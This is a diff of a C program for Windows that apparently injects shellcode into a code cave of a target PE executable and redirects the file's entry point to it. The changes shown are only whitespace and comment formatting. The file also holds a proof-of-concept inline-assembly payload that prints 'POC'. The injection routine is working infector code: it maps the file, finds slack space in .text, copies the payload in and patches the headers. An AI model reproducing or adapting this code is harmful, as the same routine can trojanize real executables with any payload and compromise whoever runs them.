@@ -1,18 +1,18 @@
 #include <stdio.h>
 #include <Windows.h>
 
-/****************
-|				|
+/***********************|
+|			|
 |	PAYLOAD		|
-|				|
-****************/
+|			|
+************************/
 
 __declspec(naked) Payload(VOID) {
 	__asm {
 
 		// GetStdHandle
-		push	-11					// arg1 = -11 = stdout
-		mov		eax, 0xAAAAAAAA		// placeholder for GetStdHandle address
+		push	-11			// arg1 = -11 = stdout
+		mov	eax, 0xAAAAAAAA		// placeholder for GetStdHandle address
 		call	eax
 
 		// WriteConsoleA
@@ -21,14 +21,14 @@ __declspec(naked) Payload(VOID) {
 		mov 	ecx, esp		
 
 		push	ebx
-		mov		ebx, esp
+		mov	ebx, esp
 
-		push	0					// arg5 = 0
-		push	ebx					// arg4 = ptr to var (num chars written)
-		push	5					// arg3 = len of string
-		push	ecx					// arg2 = ptr to str "POC"
-		push	eax					// arg1 = handle to stdout
-		mov		eax, 0xBBBBBBBB		// placeholder for WriteConsoleA address
+		push	0			// arg5 = 0
+		push	ebx			// arg4 = ptr to var (num chars written)
+		push	5			// arg3 = len of string
+		push	ecx			// arg2 = ptr to str "POC"
+		push	eax			// arg1 = handle to stdout
+		mov	eax, 0xBBBBBBBB		// placeholder for WriteConsoleA address
 		call	eax
 
 	}
@@ -38,9 +38,9 @@ void PayloadEnd() {}
 int main(int argc, char* argv[]) {
 
 	/********************************************************************************************
-	|																							|
-	|	(0) check number of arguments															|
-	|																							|
+	|											    |			
+	|	(0) check number of arguments							    |
+	|									      		    |
 	********************************************************************************************/
 
 	if (argc != 2) {
@@ -49,9 +49,9 @@ int main(int argc, char* argv[]) {
 	}
 
 	/********************************************************************************************
-	|																							|
-	|	(1) open and map target file															|
-	|																							|
+	|						    					    |
+	|	(1) open and map target file							    |
+	|											    |
 	********************************************************************************************/
 
 	HANDLE hTarget, hTargetMapping;
@@ -80,38 +80,38 @@ int main(int argc, char* argv[]) {
 	lpTarget = (LPBYTE)MapViewOfFile(hTargetMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, dwTargetSize);
 
 	/********************************************************************************************
-	|																							|
-	|	(2) get target file info	 															|
-	|																							|
+	|											    |
+	|	(2) get target file info	 						    |
+	|											    |
 	********************************************************************************************/
 
 	PIMAGE_DOS_HEADER pidh;
 	PIMAGE_NT_HEADERS pinh;
 
 	// get PE header 
-	pidh = (PIMAGE_DOS_HEADER)lpTarget;							// DOS header
+	pidh = (PIMAGE_DOS_HEADER)lpTarget;				// DOS header
 	pinh = (PIMAGE_NT_HEADERS)((DWORD)pidh + pidh->e_lfanew);	// PE header
 
 	/********************************************************************************************
-	|																							|
-	|	(3) get payload info 																	|
-	|																							|
+	|									 		    |
+	|	(3) get payload info 								    |
+	|											    |
 	********************************************************************************************/
 
 	/***********************************************
-	|	(c) get payload size					   |
+	|	(c) get payload size		       |
 	***********************************************/
 
 	DWORD dwShellcodeSize = (DWORD)PayloadEnd - (DWORD)Payload;
 
 	/********************************************************************************************
-	|																							|
-	|	(4) find code cave	 																	|
-	|																							|
+	|											    |
+	|	(4) find code cave	 							    |
+	|									 		    |
 	********************************************************************************************/
 
 	/***********************************************
-	|	(a) find .text section 					   |
+	|	(a) find .text section 		       |
 	***********************************************/
 
 	int i;
@@ -130,7 +130,7 @@ int main(int argc, char* argv[]) {
 	}
 
 	/***********************************************
-	|	(b) find code cave  					   |
+	|	(b) find code cave  		       |
 	***********************************************/
 
 	DWORD dwCodecaveOffset, dwCount = 0;
@@ -159,28 +159,28 @@ int main(int argc, char* argv[]) {
 	}
 
 	/********************************************************************************************
-	|																							|
-	|	(5) inject shellcode into code cave 													|
-	|																							|
+	|									   		    |
+	|	(5) inject shellcode into code cave 						    |
+	|											    |
 	********************************************************************************************/
 
 	/* copy shellcode into code cave */
 	memcpy((LPBYTE)(lpTarget + dwCodecaveOffset), Payload, dwShellcodeSize);
 
 	/********************************************************************************************
-	|																							|
-	|	(6) patch target file				 													|
-	|																							|
+	|											    |
+	|	(6) patch target file				 				    |
+	|											    |
 	********************************************************************************************/
 
 	/***********************************************
-	|	(a) set entry point to payload			   |
+	|	(a) set entry point to payload	       |
 	***********************************************/
 	
 	pinh->OptionalHeader.AddressOfEntryPoint = dwCodecaveOffset + pish->VirtualAddress - pish->PointerToRawData;
 	
 	/***********************************************
-	|	(b) augment section size				   |
+	|	(b) augment section size	       |
 	***********************************************/
 
 
@@ -188,7 +188,7 @@ int main(int argc, char* argv[]) {
 
 
 	/***********************************************
-	|	(d) set payload function addresses		   |
+	|	(d) set payload function addresses     |
 	***********************************************/
 
 	HMODULE hLibrary = LoadLibrary("kernel32.dll");
